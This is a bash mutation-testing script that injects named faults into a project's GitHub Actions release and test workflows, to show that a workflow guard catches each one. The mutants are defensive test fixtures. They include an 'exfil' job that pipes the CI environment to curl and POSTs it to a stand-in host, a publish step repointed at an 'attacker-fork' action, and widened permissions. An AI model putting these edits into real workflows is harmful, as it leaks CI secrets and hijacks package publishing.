#!/usr/bin/env bash
# Apply one named mutation to the real workflow tree, for proving that
# scripts/check_workflows.py actually kills it.
#
# THE LIST BELOW IS THE SINGLE SOURCE. The verification loop in
# .consiliency/evidence/mutation-189.md consumes `--list` verbatim rather than
# repeating the names, and tests/test_workflow_guards.py asserts that every
# mutant it exercises appears here. Four consecutive revisions of the plan
# shipped a mutant list that disagreed with the loop that was supposed to run
# it; reading the set from one place is the fix for that.
#
# The set is the explicit UNION of every case any acceptance criterion needs:
# the release invariants, the timeout invariants, the drift cases, the
# step-level and both-levels-of-permissions cases, and — deliberately — the
# cases that are NOT covered, so the evidence can name them individually and
# show their real green exit code instead of quietly omitting them.
#
#   --list   name|expected_exit|expected_reason_tags|description
#
# expected_exit is what `check_workflows.py --base-ref <pre-mutant commit>`
# must return. expected_reason_tags names which check must report it, so a
# mutant killed by the wrong check (e.g. drift silently dead while the
# invariants cover for it) is a loop failure, not a pass.
#
# Usage:
#   scripts/_mutate_workflow.sh --list
#   scripts/_mutate_workflow.sh <name>       # mutates the working tree
#
# Every edit asserts its anchor matches EXACTLY ONCE, so an anchor that drifts
# out of the file fails loudly instead of applying nothing and reporting a
# comfortable green.

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
RELEASE="${REPO_ROOT}/.github/workflows/release.yml"
TEST_WF="${REPO_ROOT}/.github/workflows/test.yml"
MAINTENANCE="${REPO_ROOT}/.github/workflows/maintenance.yml"

MUTANTS="$(
	cat <<'TSV'
tag-case|1|[release]|release.yml: tag filter "v*" -> "V*"; workflow stays valid and simply never runs at tag push
tags-deleted|1|[release]|release.yml: push.tags replaced by push.branches; the release trigger is gone
trigger-pull-request-added|1|[release]|release.yml: pull_request added ALONGSIDE the tag trigger; trusted publishing (id-token: write, no environment protection rules) becomes reachable from any same-repo PR
trigger-push-branches-added|1|[release]|release.yml: push.branches [main] added alongside push.tags; combined filters fire for either ref type, so every ordinary push to main reaches the publish path
trigger-workflow-dispatch-added|1|[release]|release.yml: workflow_dispatch added; struck as dangerous during #187, and it makes the publish path manually reachable from any branch
trigger-paths-filter-added|1|[release]|release.yml: a paths filter added under push alongside tags
env-dropped|1|[release]|release.yml: environment: release removed from publish
env-renamed|1|[release]|release.yml: environment: release -> dev; GitHub auto-creates it, so a presence check passes
needs-build-dropped|1|[release]|release.yml: publish no longer needs build; an untested artifact can publish
needs-publish-to-build|1|[release]|release.yml: github-release needs build instead of publish; a release without a publish
continue-on-error-job|1|[release]|release.yml: continue-on-error: true on the publish JOB; tag push reports green with no publish
continue-on-error-step|1|[release]|release.yml: continue-on-error: true on the Publish to PyPI STEP; the job-level rule bypassed one level down
if-on-build-job|1|[release]|release.yml: an if: expression on the BUILD job; skipping it skips publish through needs and the tag push concludes green
continue-on-error-build-job|1|[release]|release.yml: continue-on-error: true on the build job; a failed build's artifact publishes anyway
new-tag-triggered-workflow|1|[release]|a NEW tag-triggered workflow file (release-notes.yml, contents: write) that is not release.yml: silent to the release invariants, to drift (no base version) and to release-diff-ack (which greps for release.yml)
if-on-publish-job|1|[release]|release.yml: an if: expression on the publish JOB; a skipped job reports success
if-on-publish-step|1|[release]|release.yml: an if: expression on the Publish to PyPI STEP
forked-action|1|[release]|release.yml: pypa/gh-action-pypi-publish repointed at a fork, with the release environment in scope
permissions-job-widened|1|[release]|release.yml: publish job permissions widened with contents: write
permissions-workflow-level|1|[release]|release.yml: workflow-level permissions: write-all; every job map is untouched while build is widened
job-added|1|[release]|release.yml: an extra exfil job added, carrying a valid timeout so only the job-set rule can see it
job-deleted|1|[release] [drift]|release.yml: the publish job deleted outright
file-deleted|1|[release] [drift]|release.yml deleted entirely
timeout-360|1|[timeout]|release.yml build: timeout-minutes 20 -> 360, re-creating the six-hour default #187 exists to fix
timeout-1|1|[timeout]|release.yml build: timeout-minutes 20 -> 1, killing a multi-minute job after one minute
timeout-string|1|[timeout]|release.yml build: timeout-minutes -> "not a number"
timeout-bool|1|[timeout]|release.yml build: timeout-minutes -> true (a bool is an int in Python)
timeout-deleted|1|[timeout]|release.yml build: timeout-minutes removed, restoring the 360-minute default
maintenance-deleted|1|[drift]|maintenance.yml deleted; invisible to the release and timeout invariants, which only see surviving files
changelog-job-deleted|1|[drift]|test.yml: the changelog job deleted; the file stays valid and every surviving job keeps its timeout
workflows-job-deleted|1|[drift]|test.yml: this guard's own job deleted (see the residual note in mutation-189.md)
needs-as-list|0|-|release.yml: needs: build -> needs: [build]; a legitimate equivalent form that must NOT false-positive
timeout-below-p100|0|-|NOT COVERED: release.yml build timeout-minutes 20 -> 12, above the floor but potentially below a future p100
concurrency-added|0|-|NOT COVERED by invariant: workflow-level concurrency with cancel-in-progress on release.yml; release-diff-ack covers it by label
guard-self-disabled|0|-|NOT COVERED by the checker: if: false on this guard's own job; GitHub counts a skipped job as satisfying a required check. Caught by the test job, not by this script
guard-self-disabled-nonconstant|0|-|NOT COVERED by the checker: an always-false but NON-constant if: on the same job; actionlint's if-cond rule only sees the literal. Caught by the test job
guard-step-gutted|0|-|NOT COVERED by the checker: the checker step's command replaced by a no-op, since the script runs from the PR branch. Caught by the test job
TSV
)"

usage() {
	echo "usage: $0 --list | $0 <mutant-name>" >&2
}

if [ "$#" -ne 1 ]; then
	usage
	exit 2
fi

if [ "$1" = "--list" ]; then
	printf '%s\n' "$MUTANTS"
	exit 0
fi

NAME="$1"
if ! printf '%s\n' "$MUTANTS" | cut -d'|' -f1 | grep -qx -- "$NAME"; then
	echo "unknown mutant: ${NAME}" >&2
	usage
	exit 2
fi

# replace FILE OLD NEW -- OLD must occur exactly once.
replace() {
	MUT_FILE="$1" MUT_OLD="$2" MUT_NEW="$3" python3 - <<'PY'
import os
import pathlib
import sys

path = pathlib.Path(os.environ["MUT_FILE"])
text = path.read_text()
old = os.environ["MUT_OLD"]
new = os.environ["MUT_NEW"]
found = text.count(old)
if found != 1:
    sys.exit(
        f"mutation anchor matched {found} times (expected exactly 1) in {path}:\n{old!r}"
    )
path.write_text(text.replace(old, new))
PY
}

# delete_block FILE START END -- drops [START, END) ; both must occur once.
delete_block() {
	MUT_FILE="$1" MUT_START="$2" MUT_END="$3" python3 - <<'PY'
import os
import pathlib
import sys

path = pathlib.Path(os.environ["MUT_FILE"])
lines = path.read_text().splitlines(keepends=True)
start_marker = os.environ["MUT_START"]
end_marker = os.environ["MUT_END"]
starts = [i for i, line in enumerate(lines) if line.rstrip("\n") == start_marker]
ends = [i for i, line in enumerate(lines) if line.rstrip("\n") == end_marker]
if len(starts) != 1 or len(ends) != 1:
    sys.exit(
        f"block anchors matched {len(starts)}/{len(ends)} times (expected 1/1) in {path}"
    )
start, end = starts[0], ends[0]
if end <= start:
    sys.exit(f"end anchor precedes start anchor in {path}")
path.write_text("".join(lines[:start] + lines[end:]))
PY
}

append() {
	MUT_FILE="$1" MUT_TEXT="$2" python3 - <<'PY'
import os
import pathlib

path = pathlib.Path(os.environ["MUT_FILE"])
with path.open("a") as handle:
    handle.write(os.environ["MUT_TEXT"])
PY
}

case "$NAME" in
tag-case)
	replace "$RELEASE" '      - "v*"' '      - "V*"'
	;;
tags-deleted)
	replace "$RELEASE" '  push:
    tags:
      - "v*"
' '  push:
    branches: [main]
'
	;;
trigger-pull-request-added)
	replace "$RELEASE" 'on:
  push:
' 'on:
  pull_request: {}
  push:
'
	;;
trigger-push-branches-added)
	replace "$RELEASE" '  push:
    tags:
' '  push:
    branches: [main]
    tags:
'
	;;
trigger-workflow-dispatch-added)
	replace "$RELEASE" 'on:
  push:
' 'on:
  workflow_dispatch:
  push:
'
	;;
trigger-paths-filter-added)
	replace "$RELEASE" '  push:
    tags:
' '  push:
    paths: ["**"]
    tags:
'
	;;
env-dropped)
	replace "$RELEASE" '    environment: release
' ''
	;;
env-renamed)
	replace "$RELEASE" '    environment: release' '    environment: dev'
	;;
needs-build-dropped)
	replace "$RELEASE" '    needs: build
' ''
	;;
needs-publish-to-build)
	replace "$RELEASE" '    needs: publish' '    needs: build'
	;;
needs-as-list)
	replace "$RELEASE" '    needs: build' '    needs: [build]'
	;;
continue-on-error-job)
	replace "$RELEASE" '  publish:
    needs: build
' '  publish:
    needs: build
    continue-on-error: true
'
	;;
continue-on-error-step)
	replace "$RELEASE" '      - name: Publish to PyPI
        uses: pypa/gh-action-pypi-publish@release/v1
' '      - name: Publish to PyPI
        continue-on-error: true
        uses: pypa/gh-action-pypi-publish@release/v1
'
	;;
if-on-publish-job)
	replace "$RELEASE" '  publish:
    needs: build
' '  publish:
    needs: build
    if: ${{ github.actor != '"'"'nobody'"'"' }}
'
	;;
if-on-publish-step)
	replace "$RELEASE" '      - name: Publish to PyPI
        uses: pypa/gh-action-pypi-publish@release/v1
' '      - name: Publish to PyPI
        if: ${{ github.actor != '"'"'nobody'"'"' }}
        uses: pypa/gh-action-pypi-publish@release/v1
'
	;;
if-on-build-job)
	replace "$RELEASE" '  build:
    runs-on: ubuntu-latest
' '  build:
    if: ${{ github.actor != '"'"'nobody'"'"' }}
    runs-on: ubuntu-latest
'
	;;
continue-on-error-build-job)
	replace "$RELEASE" '  build:
    runs-on: ubuntu-latest
' '  build:
    continue-on-error: true
    runs-on: ubuntu-latest
'
	;;
new-tag-triggered-workflow)
	cat >"${REPO_ROOT}/.github/workflows/release-notes.yml" <<'YAML'
name: Release notes
on:
  push:
    tags:
      - "v*"
jobs:
  notes:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: write
    steps:
      - name: Do something at tag push
        run: echo "arbitrary code at tag push"
YAML
	;;
forked-action)
	replace "$RELEASE" 'uses: pypa/gh-action-pypi-publish@release/v1' \
		'uses: attacker-fork/gh-action-pypi-publish@release/v1'
	;;
permissions-job-widened)
	replace "$RELEASE" '      id-token: write  # Required for trusted publishing
' '      id-token: write  # Required for trusted publishing
      contents: write
'
	;;
permissions-workflow-level)
	replace "$RELEASE" '
jobs:
' '
permissions: write-all

jobs:
'
	;;
concurrency-added)
	replace "$RELEASE" '
jobs:
' '
concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: true

jobs:
'
	;;
job-added)
	append "$RELEASE" '
  exfil:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    environment: release
    steps:
      - name: Collect
        run: env | curl -sS -X POST --data-binary @- https://example.invalid/collect
'
	;;
job-deleted)
	delete_block "$RELEASE" '  publish:' '  github-release:'
	;;
file-deleted)
	rm -f "$RELEASE"
	;;
maintenance-deleted)
	rm -f "$MAINTENANCE"
	;;
changelog-job-deleted)
	delete_block "$TEST_WF" '  changelog:' '  typecheck:'
	;;
workflows-job-deleted)
	delete_block "$TEST_WF" '  workflows:' '  release-diff-ack:'
	;;
timeout-360)
	replace "$RELEASE" '    timeout-minutes: 20' '    timeout-minutes: 360'
	;;
timeout-1)
	replace "$RELEASE" '    timeout-minutes: 20' '    timeout-minutes: 1'
	;;
timeout-below-p100)
	replace "$RELEASE" '    timeout-minutes: 20' '    timeout-minutes: 12'
	;;
timeout-string)
	replace "$RELEASE" '    timeout-minutes: 20' '    timeout-minutes: "not a number"'
	;;
timeout-bool)
	replace "$RELEASE" '    timeout-minutes: 20' '    timeout-minutes: true'
	;;
timeout-deleted)
	replace "$RELEASE" '    timeout-minutes: 20
' ''
	;;
guard-self-disabled)
	replace "$TEST_WF" '  workflows:
    runs-on: ubuntu-latest
' '  workflows:
    if: ${{ false }}
    runs-on: ubuntu-latest
'
	;;
guard-self-disabled-nonconstant)
	replace "$TEST_WF" '  workflows:
    runs-on: ubuntu-latest
' '  workflows:
    if: ${{ github.actor == '"'"'nobody-at-all'"'"' }}
    runs-on: ubuntu-latest
'
	;;
guard-step-gutted)
	replace "$TEST_WF" \
		'        run: uv run python scripts/check_workflows.py --base-ref "${{ steps.drift-base.outputs.base }}"' \
		'        run: echo "workflow guards skipped"'
	;;
*)
	echo "unhandled mutant: ${NAME}" >&2
	exit 2
	;;
esac

echo "applied mutant: ${NAME}"
